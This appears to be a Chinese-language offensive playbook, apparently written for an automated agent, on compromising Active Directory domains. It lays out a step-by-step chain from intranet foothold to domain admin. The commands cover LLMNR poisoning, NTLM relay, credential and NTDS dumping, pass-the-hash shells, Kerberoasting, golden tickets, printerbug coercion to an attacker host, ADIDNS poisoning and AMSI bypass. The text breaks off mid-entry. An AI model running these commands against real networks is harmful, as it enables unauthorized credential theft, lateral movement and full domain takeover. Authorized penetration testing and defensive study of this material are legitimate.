# Active Directory 与 Windows 内网(Active Directory & Windows Intranet)

> **何时读本文件**:任务涉及域环境渗透、Windows 内网横向移动、SMB/WinRM/Kerberos/LDAP/MSSQL 协议攻击、域凭据转储、BloodHound 攻击路径分析时读取。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| 批量验证凭据/密码喷洒 | netexec (nxc) | crackmapexec | nxc 是 CME 停更后的活跃继任者,语法基本兼容 |
| 获取目标 SYSTEM shell | impacket-psexec | impacket-wmiexec、evil-winrm | psexec 落盘服务最稳;wmiexec 免落盘更隐蔽;WinRM 走 5985 需账户在 Remote Management Users |
| 全量转储域凭据 | impacket-secretsdump | nxc smb --ntds | secretsdump 输出最全,支持离线解析 ntds.dit |
| 捕获内网 NTLM hash | responder | impacket-ntlmrelayx | Responder 拿 hash 离线破解;relay 直接中继利用(免破解,但目标需未强制签名) |
| Kerberoasting | impacket-GetUserSPNs | rubeus(Windows 侧)、nxc ldap --kerberoasting | Linux 侧优先 impacket;已有 Windows 会话用 rubeus |
| AS-REP Roasting | impacket-getNPUsers | ldeep asreproast、rubeus asreproast | 只需一个普通域账户即可发起 |
| AD 攻击路径分析 | bloodhound CE | azurehound(Azure 环境) | 图数据库分析,定位到域管的最短路径 |
| 采集 AD 数据(无 Windows shell) | bloodhound-ce-python | sharphound(需在 Windows 执行) | Python 版从 Linux 直接采;SharpHound 数据更全(含会话/本地组) |
| WinRM 交互 shell | evil-winrm | evil-winrm-py、impacket-wmiexec | 原生支持 PTH/证书认证、PS 脚本加载、文件上传下载 |
| LDAP 全量枚举 | ldeep | nxc ldap、bloodyad | ldeep 一次命令全量导出;bloodyad 偏写操作 |
| AD 对象提权写操作 | bloodyad | krbrelayx addspn | bloodyad 专做 ACL/属性/密码修改 |
| 委派/中继滥用(RBCD/UD) | krbrelayx + impacket-getST | rubeus s4u | RBCD 全链路可在 Linux 侧完成 |
| 枚举 SMB 共享与内容 | smbmap | nxc smb --shares | smbmap 支持递归搜索、按扩展名批量下载、PTH |
| RDP 登录 | xfreerdp3 | rdesktop | FreeRDP3 活跃维护,rdesktop 已停更 |

## 典型攻击链:从内网立足到域管

```bash
# ── 阶段 0:侦察 ──
nxc smb <cidr>                                  # 探测存活 SMB 主机与签名状态
nxc smb <cidr> --gen-relay-list relay.txt       # 导出未强制签名的主机列表(中继目标)
sudo responder -I eth0 -A                       # 分析模式:只嗅探不毒化,评估环境噪音

# ── 阶段 1:Responder 毒化捕获 NTLMv2 hash ──
sudo responder -I eth0
# 捕获的 hash 写入 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
# 路径 1:离线破解(NTLMv2 = hashcat mode 5600)
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt <wordlist>
# 路径 2:不解密直接中继 —— 先在 /etc/responder/Responder.conf 把 SMB=Off、HTTP=Off,再:
sudo impacket-ntlmrelayx -tf relay.txt -smb2support

# ── 阶段 2:验证凭据与权限 ──
nxc smb <cidr> -u <user> -p <password>              # 输出 (Pwn3d!) = 对该机是本地管理员
nxc smb <ip> -u <user> -p <password> --sam --lsa    # 顺路转储本地 SAM/LSA 凭据

# ── 阶段 3:impacket 横向移动 ──
impacket-psexec '<domain>/<user>:<password>@<ip>'   # 半交互 SYSTEM shell
impacket-wmiexec -hashes :<nt_hash> '<domain>/<user>@<ip>'  # PTH,免落盘
impacket-secretsdump -just-dc '<domain>/<admin>:<password>@<dc_ip>'  # 拿下域管后全域转储

# ── 阶段 4:BloodHound 找提权路径 ──
bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip
# 将生成的 zip 上传 BloodHound CE,运行内置查询 "Shortest Path to Domain Admins"
# 依据路径类型选择后续手段:Kerberoasting / AS-REP / ACL 滥用(bloodyad)/ 委派(krbrelayx + getST)

# ── 阶段 5:Kerberos 攻击面 ──
impacket-GetUserSPNs -request -dc-ip <dc_ip> -outputfile kerb.txt '<domain>/<user>:<password>'
hashcat -m 13100 kerb.txt <wordlist>                # Kerberoast TGS(RC4)= mode 13100
```

## 核心工具详解

### impacket-psexec — 通过 SMB 服务方式获取目标 SYSTEM 半交互 shell

**用途**:仿 SysInternals PsExec,把可执行文件写入 ADMIN$ 共享并注册为服务启动,回连得到 SYSTEM shell。
**安装**:`sudo apt install impacket-scripts`
**使用场景**:已有本地管理员凭据(密码或 NTLM hash)、目标开放 445 时,是获取 shell 最直接的方式;wmiexec 被拦截或需要稳定交互时首选。

```bash
# 域账户密码认证
impacket-psexec '<domain>/<user>:<password>@<ip>'

# 本地(非域)账户
impacket-psexec '<user>:<password>@<ip>'

# Pass-the-hash(LM 部分留空)
impacket-psexec -hashes :<nt_hash> '<domain>/<user>@<ip>'

# ADMIN$ 不可写时指定其他可写共享
impacket-psexec -share C$ '<domain>/<user>:<password>@<ip>'

# Kerberos 认证(需先 export KRB5CCNAME=<ticket>.ccache,目标用 FQDN)
impacket-psexec -k -no-pass '<domain>/<user>@<target_fqdn>'
```

**实战要点**:
- 需要 ADMIN$ 可写 + 创建服务权限,普通域用户报 `STATUS_ACCESS_DENIED`;`nxc` 输出 `(Pwn3d!)` 的主机才可用
- 会向目标写入随机命名的 exe 和服务,事件日志 7045 可见;需要隐蔽时改用 wmiexec
- 密码含特殊字符时整个凭据串用单引号包裹
- 域账户写 `<domain>/<user>`,本地账户只写 `<user>`

### impacket-smbexec — 通过服务执行 cmd 并回传输出的半交互 shell

**用途**:与 psexec 同类,但不向目标上传 exe:通过 `%SYSTEMROOT%\Temp` 下的 bat 文件 + 命名管道回传命令输出,交互性略差但更少落盘。
**安装**:`sudo apt install impacket-scripts`
**使用场景**:ADMIN$ 无法写入可执行文件但仍可创建服务时;psexec 被文件检测拦截时的替代。

```bash
# 密码认证
impacket-smbexec '<domain>/<user>:<password>@<ip>'

# Pass-the-hash
impacket-smbexec -hashes :<nt_hash> '<domain>/<user>@<ip>'
```

**实战要点**:
- 同样需要管理员服务创建权限,走 445
- 交互方式为逐条命令回传,不支持交互式程序(如需要完整 shell 回退 psexec)
- 与 psexec/wmiexec/atexec 统一支持 `-hashes`、`-k`(Kerberos)、`-dc-ip` 参数

### impacket-scripts — impacket 攻击脚本套件(wmiexec/secretsdump/ntlmrelayx/GetUserSPNs 等)

**用途**:Kali 将 impacket 官方 examples 目录的脚本以 `impacket-` 前缀装入 PATH,是内网渗透的核心武器库:远程执行、凭据转储、NTLM 中继、Kerberos 攻击全套。
**安装**:`sudo apt install impacket-scripts`(一次安装即含下列全部命令)
**使用场景**:横向移动、域凭据转储、中继攻击、Kerberos 票据操作的默认选择。

```bash
# ── wmiexec:通过 WMI 执行,不落盘、不创建服务,比 psexec 隐蔽 ──
impacket-wmiexec '<domain>/<user>:<password>@<ip>'
impacket-wmiexec -hashes :<nt_hash> '<domain>/<user>@<ip>'

# ── atexec:通过计划任务(schtasks/at)执行单条命令 ──
impacket-atexec '<domain>/<user>:<password>@<ip>' 'whoami /all'

# ── dcomexec:通过 DCOM(MMC20.Application 等)执行命令 ──
impacket-dcomexec -object MMC20 '<domain>/<user>:<password>@<ip>' 'whoami'

# ── mssqlclient 见独立条目;smbserver 见独立条目 ──

# ── secretsdump:远程转储 SAM/LSA/NTDS 凭据(无需 shell)──
impacket-secretsdump '<domain>/<user>:<password>@<ip>'
impacket-secretsdump -hashes :<nt_hash> '<domain>/<user>@<ip>'
# DCSync 方式只转储 NTDS.dit 域凭据(需域管/DC 权限)
impacket-secretsdump -just-dc '<domain>/<admin>:<password>@<dc_ip>'
# 只转储单个用户
impacket-secretsdump -just-dc-user <user> '<domain>/<admin>:<password>@<dc_ip>'
# 离线解析已抓取的 ntds.dit + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM local

# ── ntlmrelayx:中继 NTLM 认证(目标未强制签名时)──
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
# 中继成功后直接执行命令 / 转储 SAM
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
sudo impacket-ntlmrelayx -tf targets.txt -smb2support --sam
# socks 模式:中继认证挂起,供 proxychains 后续使用
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# 中继到 LDAPS 做委派利用(见 krbrelayx 条目)
sudo impacket-ntlmrelayx -t ldaps://<dc_ip> --delegate-access

# ── GetUserSPNs:Kerberoasting,请求所有 SPN 账户的 TGS ──
impacket-GetUserSPNs -request -dc-ip <dc_ip> '<domain>/<user>:<password>'
impacket-GetUserSPNs -request -dc-ip <dc_ip> -outputfile kerb.txt '<domain>/<user>:<password>'
# 只请求某个用户的票据
impacket-GetUserSPNs -request-user <svc_user> -dc-ip <dc_ip> '<domain>/<user>:<password>'

# ── getNPUsers:AS-REP Roasting,无预认证账户的 hash 可离线破解 ──
impacket-getNPUsers -dc-ip <dc_ip> -request -outputfile asrep.txt '<domain>/<user>:<password>'
# 无有效凭据时,用用户名字典探测哪些账户未开预认证
impacket-getNPUsers -dc-ip <dc_ip> -usersfile users.txt -no-pass -outputfile asrep.txt '<domain>/'

# ── getST:S4U2Self/S4U2Proxy 申请服务票据(委派/RBCD 利用)──
impacket-getST -spn 'cifs/<target_fqdn>' -impersonate administrator -dc-ip <dc_ip> '<domain>/<svc_user>:<password>'
export KRB5CCNAME=administrator.ccache   # 生成的 ccache 直接给 -k 参数的 impacket 工具用

# ── getTGT:申请 TGT(密码/hash 换票据)──
impacket-getTGT '<domain>/<user>:<password>'

# ── ticketer:伪造金票/银票 ──
impacket-ticketer -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain <domain> administrator
```

**实战要点**:
- Kerberoast 票据 `hashcat -m 13100`,AS-REP `hashcat -m 18200`
- secretsdump 输出中 `aad3b435b51404eeaad3b435b51404ee` 是空 LM hash;`-just-dc` 模式还会带出 kerberos 密钥(用于金票)
- ntlmrelayx 与 Responder 不可同时抢 SMB/HTTP 端口:中继场景先在 `/etc/responder/Responder.conf` 关闭 SMB/HTTP
- 所有远程执行类工具(psexec/smbexec/wmiexec/atexec)所需权限不同:wmiexec/atexec 只需 WMI/RPC 权限,psexec/smbexec 需完整管理员

### impacket-mssqlclient — MSSQL 数据库交互客户端

**用途**:连接 MSSQL 的交互式客户端(基于 TDS 协议),支持 SQL/Windows 认证,内置 `enable_xp_cmdshell` 等命令执行辅助。
**安装**:`sudo apt install impacket-scripts`
**使用场景**:拿到 MSSQL 凭据(sa 或域账户)后,通过 xp_cmdshell 执行系统命令、枚举可登录目标(可信链接)。

```bash
# SQL 认证
impacket-mssqlclient '<user>:<password>@<ip>'

# Windows 认证(本地账户)
impacket-mssqlclient -windows-auth '<user>:<password>@<ip>'

# Windows 认证(域账户)
impacket-mssqlclient -windows-auth '<domain>/<user>:<password>@<ip>'
```

进入 SQL shell 后:

```
enable_xp_cmdshell          # 开启 xp_cmdshell
xp_cmdshell whoami          # 执行系统命令
SELECT name FROM master..sysdatabases;   -- 枚举数据库
```

**实战要点**:
- MSSQL 默认端口 1433,先由 nmap/nxc mssql 确认
- `nxc mssql <ip> -u <user> -p <password> --local-auth` 可先快速验证凭据
- MSSQL Trusted Links(mssql->mssql)可跨服务器跳转执行,常见于大型内网

### impacket-smbserver — 一行命令起一个 SMB 共享服务器

**用途**:在攻击机当前目录开启匿名 SMB 共享,用于向目标传文件、或诱捕目标发起的 SMB 认证。
**安装**:`sudo apt install impacket-scripts`
**使用场景**:目标只出 SMB 不出 HTTP 时的文件投递;配合 scf/lnk 文件放在可写共享中捕获 hash。

```bash
# 起名为 share 的匿名共享,根目录为当前目录(-smb2support 支持 SMB2)
impacket-smbserver share /path/to/dir -smb2support

# 带账号密码(目标需指定凭据访问)
impacket-smbserver share . -username <user> -password <pass> -smb2support
```

**实战要点**:
- 目标侧访问:`copy \\<attacker_ip>\share\payload.exe` 或 `net use \\<attacker_ip>\share /user:<user> <pass>`
- 与 Responder 冲突:两者都监听 445,同时运行前先停掉对方
- 传完即 Ctrl-C 关闭,长开易被巡查发现

### netexec — 大网络批量验证/枚举/执行的多协议瑞士军刀(CME 继任者)

**用途**:CrackMapExec 的活跃续作(命令 `nxc`),一条命令对一批主机做 SMB/WinRM/MSSQL/LDAP/SSH/RDP 等协议的枚举、凭据验证、喷洒与命令执行。
**安装**:`sudo apt install netexec`
**使用场景**:任何"我有凭据/我想知道谁在管这台机器"的批量场景;凭据喷洒前先用它确认账户锁定阈值。

```bash
# ── 探测 ──
nxc smb <ip>                               # 版本/签名/主机名
nxc smb <cidr> --gen-relay-list relay.txt  # 导出未强制签名主机(给 ntlmrelayx)

# ── 凭据验证(密码喷洒核心用法)──
nxc smb <ip> -u <user> -p <password>
nxc smb <cidr> -u users.txt -p passwords.txt --continue-on-success
nxc smb <ip> -u '' -p ''                            # 空会话
nxc smb <ip> -u <user> -H <ntlm_hash>              # Pass-the-hash
nxc smb <ip> -u <user> -p <password> --local-auth  # 强制本地 SAM 认证

# ── 枚举 ──
nxc smb <ip> -u <user> -p <password> --shares
nxc smb <ip> -u <user> -p <password> --smb-sessions
nxc smb <ip> -u <user> -p <password> --loggedon-users   # 定位域管登录在哪台机
nxc smb <ip> -u <user> -p <password> --users --groups
nxc smb <ip> -u <user> -p <password> --pass-pol          # 锁定阈值,喷洒前必看

# ── 凭据转储 ──
nxc smb <ip> -u <user> -p <password> --sam
nxc smb <ip> -u <user> -p <password> --lsa
nxc smb <dc_ip> -u <admin> -p <password> --ntds          # 对 DC 转储全域 hash

# ── 命令执行 ──
nxc smb <ip> -u <user> -p <password> -x 'whoami'         # cmd
nxc smb <ip> -u <user> -p <password> -X 'whoami'         # powershell
nxc winrm <ip> -u <user> -p <password> -X 'whoami'

# ── LDAP 攻击 ──
nxc ldap <dc_ip> -u <user> -p <password> --kerberoasting kerb.txt
nxc ldap <dc_ip> -u <user> -p <password> --asreproast asrep.txt

# ── MSSQL ──
nxc mssql <ip> -u <user> -p <password> --local-auth
```

**实战要点**:
- 输出中 `(Pwn3d!)` 表示该凭据对目标为本地管理员,可直接上 impacket-psexec
- 喷洒前必读 `--pass-pol`:锁定阈值通常 5 次/30 分钟,喷洒节奏 = 1 密码 × 全部用户
- `nxc winrm` 成功的账户即可用 evil-winrm 拿交互 shell
- 工作区数据库在 `~/.nxc`(CME 在 `~/.cme`),记录所有历史成功凭据

### crackmapexec — netexec 的前身(已停止维护)

**用途**:与 netexec 同源同语法的经典内网瑞士军刀,现已停更;新项目应直接用 netexec。
**安装**:`sudo apt install crackmapexec`
**使用场景**:目标环境文档/历史脚本基于 cme 语法时使用;否则一律换 nxc。

```bash
# 语法与 netexec 一致,协议模块 smb/winrm/mssql/ldap 等
crackmapexec smb <ip> -u <user> -p <password> --shares
crackmapexec smb <dc_ip> -u <admin> -p <password> --ntds
cme smb <cidr> -u users.txt -p <password> --continue-on-success   # 短命令 cme
```

**实战要点**:
- cme 与 nxc 不可同时对同一数据库目录运行
- 老版本部分模块(如 --wcc、--spider)在 nxc 中已重构为 `-M <module>` 模块体系

### responder — LLMNR/NBT-NS/mDNS 毒化器,内网抓 hash 第一工具

**用途**:伪造内网名称解析应答(LLMNR/NBT-NS/mDNS),截获主机发起的 SMB/HTTP/LDAP 等认证,得到可离线破解的 NTLMv2 hash;内置 WPAD 伪装代理。
**安装**:`sudo apt install responder`
**使用场景**:进入内网后的第一批动作之一——等待(或诱导)主机访问不存在的资源名;无凭据起点时最主要的凭据来源。

```bash
# 常规:监听指定接口,毒化并捕获认证
sudo responder -I eth0

# 分析模式:只嗅探不毒化,先评估环境再动手
sudo responder -I eth0 -A

# 官网示例:指定本机 IP,开启 WPAD 伪装代理、netbios wredir 应答与指纹
responder -i <ip> -w On -r On -f On
```

**实战要点**:
- 捕获的 hash 在 `/usr/share/responder/logs/`(SMB-NTLMv2-SSP-*.txt),`hashcat -m 5600` 破解
- 破解不动时转中继:在 `/etc/responder/Responder.conf` 把 `SMB=Off`、`HTTP=Off`,由 `impacket-ntlmrelayx` 接管 445/80
- `nxc smb <cidr> --gen-relay-list` 先筛出未强制签名的目标再中继
- 挑战值默认固定在 Responder.conf 的 Challenge 字段,可自定义为全零便于彩虹表/快速破解判断

### evil-winrm — WinRM 交互 shell(功能最全)

**用途**:通过 WinRM(5985/5986)获得目标交互 PowerShell,支持密码/NTLM hash/证书认证、PS 脚本与 exe 加载、文件上传下载、AMSI bypass。
**安装**:`sudo apt install evil-winrm`
**使用场景**:账户在 Remote Management Users 组(常见于svc账户被误授权)时,是拿交互 shell 的首选。

```bash
# 密码认证
evil-winrm -i <ip> -u <user> -p <password>

# Pass-the-hash
evil-winrm -i <ip> -u <user> -H <ntlm_hash>

# SSL(5986)
evil-winrm -i <ip> -S -u <user> -p <password>

# 证书认证(AD CS 滥用拿到证书后)
evil-winrm -i <ip> -S -c cert.pem -k priv.key

# 预加载 PowerShell 脚本目录与可执行文件目录
evil-winrm -i <ip> -u <user> -p <password> -s /usr/share/nishang/Gather/ -e /opt/binaries/
```

进入 shell 后内置命令:

```
menu                       # 列出可用扩展命令
Bypass-4MSI                # AMSI bypass(执行 ps 脚本前先跑)
upload /local/file.exe C:\\Temp\\file.exe
download C:\\Temp\\loot.txt /tmp/loot.txt
```

**实战要点**:
- 先 `nxc winrm <ip> -u <user> -p <password>` 确认 `[+]` 成功再连,避免锁定账户
- WinRM 认证成功但非管理员时无文件传输权限,需提权后再上传
- Kerberos 环境可配合 `-r <domain>` 使用票据(需先 kinit)

### bloodhound — AD 攻击路径图分析平台(CE 版)

**用途**:BloodHound Community Edition,把 AD 关系(成员、ACL、会话、委派、GPO)建成图数据库,自动发现从普通账户到 Domain Admins 的最短提权路径。
**安装**:`sudo apt install bloodhound`
**使用场景**:拿到任意域账户后的必做步骤——人工看不出的 ACL/委派/嵌套组路径由它算出。

```bash
# Kali 包把 CE 部署文件放在 /usr/share/bloodhound,以 docker compose 运行
cd /usr/share/bloodhound && sudo docker compose up -d
# 首次启动从日志中取 admin 初始随机密码
sudo docker compose logs 2>&1 | grep -i password
# 浏览器访问 http://127.0.0.1:8080/ui/login,首次登录强制改密
```

**实战要点**:
- 采集器(bloodhound-ce-python / sharphound / rubeus)产出的 zip 在 UI 右上角 Upload 入库
- 常用内置查询:Shortest Path to Domain Admins、Kerberoastable Users、AS-REP Roastable Users、Find Workstations where Domain Users are Logged In
- Cypher 快查示例(AS-REP 可烤账户):`MATCH (u:User {dontreqpreauth: true}) RETURN u`
- 采集数据越多(尤其 Session/LocalAdmin),路径越准;`-c DCOnly` 最安静但无会话数据

### bloodhound-python / bloodhound-ce-python — 从 Linux 远程采集 AD 数据

**用途**:基于 impacket 的 BloodHound 采集器,只需一个域账户即可从 Linux 直接拉取全部域数据;`bloodhound-ce-python` 对应 CE 版,旧 `bloodhound-python` 对应 legacy(≤4.3.1)。
**安装**:`sudo apt install bloodhound-python`(Kali 现以 bloodhound-ce-python 包提供,命令为 `bloodhound-ce-python`)
**使用场景**:没有 Windows shell 可跑 SharpHound 时,纯 Linux 侧采集。

```bash
# 全量采集(密码认证);-ns 指定解析用的 DC
bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip

# Pass-the-hash
bloodhound-ce-python -d <domain> -u <user> -hashes :<nt_hash> -ns <dc_ip> -c All

# 只采 DC 数据(不碰成员机,最安静,无会话/本地组信息)
bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c DCOnly

# 旧版 BloodHound(<=4.3.1)用:
bloodhound-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip
```

**实战要点**:
- 产出的 `*_bloodhound.zip` 直接上传 BloodHound CE
- `--zip` 打包所有 json;不指定则输出散装 json 文件
- 需要 DNS 能解析域名(-ns 指向 DC 即可,不必改全局 DNS);Kerberos 认证加 `-k` 并配合 kinit

### sharphound — C# 版 BloodHound 采集器(在 Windows 上运行)

**用途**:官方 C# 采集器,数据最全(会话、本地组、ACL、委派、GPO),适合已有 Windows shell 时一次性全量采集。
**安装**:`sudo apt install sharphound`(Kali 提供预编译 exe)
**使用场景**:已通过 evil-winrm/psexec 拿到 Windows shell,采集深度数据(尤其 Session)。

```bash
# 定位 Kali 包内的 exe,上传到目标
dpkg -L sharphound
evil-winrm -i <ip> -u <user> -p <password>
# evil-winrm shell 内:
upload /usr/share/sharphound/SharpHound.exe C:\\Temp\\SharpHound.exe
```

目标机上执行:

```
SharpHound.exe -c All
SharpHound.exe -c All --Stealth           # 低速模式,减少流量特征
SharpHound.exe -c Session --Domain <domain>   # 只采会话,定位域管登录位置
```

**实战要点**:
- 产出 `*_BloodHound.zip` 在当前目录,download 回来上传 BloodHound
- 会话采集(Loop)对 DC 查询频繁,`--Stealth` 或只跑 `Session` 可控噪音
- .NET 4.6.2+ 环境;老系统用旧版本 SharpHound

### rubeus — Windows 侧 Kerberos 原语工具集(C#)

**用途**:在 Windows 上操作 Kerberos 全流程:请求/导入/转储票据、Kerberoasting、AS-REP、S4U 委派滥用、票据传递。
**安装**:`sudo apt install rubeus`(Kali 提供 exe;用 `dpkg -L rubeus` 定位后上传)
**使用场景**:已有 Windows shell 且目标走 Kerberos(端口 88 通 DC)时,比从 Linux 操作票据更少跨协议痕迹。

```bash
dpkg -L rubeus    # 定位 Rubeus.exe 并上传到目标
```

目标机(evil-winrm shell)内执行:

```
Rubeus.exe kerberoast /outfile:C:\Temp\kerb.txt          # Kerberoasting
Rubeus.exe asreproast /format:hashcat /nowrap            # AS-REP Roasting
Rubeus.exe tgtdeleg /nowrap                               # 无票据情况下获取可用 TGT(Base64)
Rubeus.exe hash /password:<password> /user:<user> /domain:<domain>   # 生成 RC4/AES key
Rubeus.exe asktgt /user:<user> /password:<password> /ptt  # 申请 TGT 并注入当前会话
Rubeus.exe dump                                           # 转储当前会话票据
Rubeus.exe ptt /ticket:<base64_kirbi>                     # 票据传递
Rubeus.exe s4u /user:<svc_user> /rc4:<nt_hash> /impersonate:administrator /msdsspn:"cifs/<target>" /ptt   # S4U2Self+Proxy
Rubeus.exe harvest /interval:30                           # 持续收割内存中新建票据
```

**实战要点**:
- `/nowrap` 输出单行 Base64 kirbi,方便复制;转 Linux 用需 kirbi→ccache 转换(ticket_converter)
- kerberoast 输出 `hashcat -m 13100`
- `/ptt`(pass the ticket)即时生效,无需 klist purge 之外操作;s4u 是 RBCD/约束委派利用的核心

### kerberoast — Kerberos 攻击脚本集(含票据破解)

**用途**:经典 Kerberoast 工具集:GetUserSPNs 请求票据、tgsrepcrack/kirbi2john 破解、从 pcap 提取票据。
**安装**:`sudo apt install kerberoast`(脚本位于 `/usr/share/kerberoast/`)
**使用场景**:需要离线破解 .kirbi 票据,或没有 impacket 环境时的备用采集方式。

```bash
# 破解 kirbi 票据(字典攻击)
python3 /usr/share/kerberoast/tgsrepcrack.py <wordlist> <ticket.kirbi>

# kirbi 转 john 格式再破解
python3 /usr/share/kerberoast/kirbi2john.py <ticket.kirbi> > hash.txt
john --wordlist=<wordlist> hash.txt

# 从抓包中提取票据
python3 /usr/share/kerberoast/extracttgsrepfrompcap.py <capture.pcap>

# 查看包内全部脚本(GetUserSPNs.ps1/.vbs 需复制到 Windows 执行)
ls /usr/share/kerberoast/
```

**实战要点**:
- 现代 RC4-HMAC 票据破解 `hashcat -m 13100` 更快;tgsrepcrack 适合无 GPU 场景
- AES 票据(`krb5tgs$18`)字典基本打不动,优先找仍用 RC4 的服务账户
- GetUserSPNs.ps1 在域内任意 Windows 主机以普通用户即可请求全部 SPN 票据

### krbrelayx — Kerberos 中继与委派滥用套件

**用途**:Kerberos relaying + 非约束委派捕获 + SPN/LDAP 操作套件,包含 krbrelayx、addspn、printerbug、dnstool。
**安装**:`sudo apt install krbrelayx`
**使用场景**:RBCD(基于资源的约束委派)全链路、非约束委派捕获 DC 票据、ADIDNS 通配符记录投毒。

```bash
# ── RBCD 利用链 ──
# 1. 中继机器账户认证到 LDAPS,给攻击机机器账户加 RBCD 权限(--delegate-access)
sudo impacket-ntlmrelayx -t ldaps://<dc_ip> --delegate-access
# 2. 触发目标机器向攻击机认证(printerbug 触发回连)
printerbug '<domain>/<user>:<password>@<target_ip>' <attacker_ip>
# 3. 攻击机机器账户 S4U 申请目标机器的服务票据
impacket-getST -spn 'cifs/<target_fqdn>' -impersonate administrator -dc-ip <dc_ip> '<domain>/<attacker_machine>$:<machine_password>'
export KRB5CCNAME=administrator.ccache
# 4. Kerberos 方式登录目标
impacket-psexec -k -no-pass '<domain>/administrator@<target_fqdn>'

# ── 非约束委派捕获:攻击机账户被配置 UD 后,钓 DC 的 TGT ──
sudo krbrelayx -aesKey <aes256_key_of_delegated_machine_account>
printerbug '<domain>/<user>:<password>@<dc_ip>' <attacker_ip>
# 捕获到 DC TGT 后保存为 ccache,用 secretsdump -k 直接 DCSync

# ── addspn:通过 LDAP 给账户增删 SPN ──
addspn -u '<domain>\<user>' -p '<password>' -t <target> -s 'cifs/<target_fqdn>' <dc_ip>

# ── dnstool:ADIDNS 记录操作(通配符投毒配合 Responder)──
dnstool -u '<domain>\<user>' -p '<password>' --record '*' --action query <dc_ip>
dnstool -u '<domain>\<user>' -p '<password>' --record '*' --action add --data <attacker_ip> <dc_ip>
```

**实战要点**:
- RBCD 前提:能修改目标机器对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`(如持有 GenericWrite/GenericAll),且有一个可控机器账户(用 `impacket-addcomputer '<domain>/<user>:<password>' -computer-name 'EVIL$' -computer-pass <pass>` 创建;普通域用户默认可建机器账户,能否成功看域的 MachineAccountQuota 配额)
- 中继 LDAPS 需目标 DC 证书有效、未强制签名/信道绑定(默认常见可打)
- dnstool 的 `-u` 用反斜杠格式 `domain\user`,与 impacket 系的 `domain/user` 不同

### bloodyad — AD 提权写操作框架(LDAP)

**用途**:直接对 DC 的 LDAP 做提权类写操作:改属性、加对象、改密码、加 ACL 权限;支持密码/PHT/票据/证书认证,可透明走 SOCKS 代理。
**安装**:`sudo apt install bloodyad`
**使用场景**:BloodHound 找到 ACL 滥用路径(GenericAll/WriteProperty/WriteDacl 等)后,用它落地执行。

```bash
# 通用格式:bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> <子命令>
# Pass-the-hash 用 -ht <ntlm_hash> 替代 -p

# 读取对象属性(确认 userAccountControl、SPN 等)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> getObjectAttributes '<dn>' sAMAccountName userAccountControl

# 添加域用户
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> addUser <new_user> <new_password>

# 给指定账户加 GenericAll(ACL 滥用核心)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> addGenericAll '<target_dn>' <grantee_user>

# 重置任意用户密码(需对该对象有 WriteProperty/AllExtendedRights)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> setPassword '<target_dn>' <new_password>

# 修改 userAccountControl(如开启 DONT_REQ_PREAUTH 为 AS-REP 做准备)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> setObjectAttribute '<target_dn>' userAccountControl 4194304
```

**实战要点**:
- `<dn>` 形如 `CN=<user>,CN=Users,DC=corp,DC=local`
- 大量普通域用户对 OU/组对象有多余 ACL——先 BloodHound 确认路径再用,避免盲写触发告警
- 不走 LDAPS 也支持(明文 LDAP),内网封 636 时的替代方案

### ldeep — LDAP 深度枚举工具

**用途**:对一个域做全量 LDAP 枚举导出:用户/组/计算机/SPN/GPO/OUS/信任/AS-REP 账户等,一条命令落盘。
**安装**:`sudo apt install ldeep`
**使用场景**:拿到的域账户权限不足以跑 BloodHound(或需要轻量纯文本结果)时,快速摸清域内对象;也用于离线复查已缓存数据(`ldeep cache`)。

```bash
# 全量枚举并落盘
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> all

# 分类枚举
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> users
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> groups
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> computers
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> kerberos      # SPN 账户
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> asreproast    # 无预认证账户
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> trusts
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> gpo

# Pass-the-hash
ldeep ldap -d <domain> -u <user> -H <ntlm_hash> -s <dc_ip> all

# 结果写文件
ldeep -o out.txt ldap -d <domain> -u <user> -p <password> -s <dc_ip> users
```

**实战要点**:
- `-o` 落盘;`all` 输出量在大域上很大,建议先 `users`/`groups` 分步
- 加 `--security_desc`(同为顶层参数,须放在 `ldap` 子命令之前)可导出安全描述符,离线分析 ACL
- `kerberos`/`asreproast` 输出可直接喂给后续攻击(GetUserSPNs/getNPUsers)

### smbmap — SMB 共享枚举与内容搜索

**用途**:枚举整个域的共享列表与权限(读/写),递归浏览/下载/上传文件,支持按扩展名批量自动下载与远程命令执行,支持 PTH。
**安装**:`sudo apt install smbmap`
**使用场景**:定位可写共享(投递诱饵文件)与含敏感文件的共享(备份、配置、脚本)。

```bash
# 列出共享与权限(READ/WRITE 标记)
smbmap -H <ip> -u <user> -p <password> -d <domain>

# Pass-the-hash(hash 作密码传入)
smbmap -H <ip> -u <user> -p <ntlm_hash> -d <domain>

# 递归列出共享内容
smbmap -H <ip> -u <user> -p <password> -R <share>

# 搜索并按扩展名自动下载(A 参数模式)
smbmap -H <ip> -u <user> -p <password> -R <share> -A <pattern>

# 下载 / 上传单个文件
smbmap -H <ip> -u <user> -p <password> --download '<share>\\path\\file.txt'
smbmap -H <ip> -u <user> -p <password> --upload /local/file.txt '<share>\\path\\file.txt'

# 远程命令执行(需可写共享 + 服务权限)
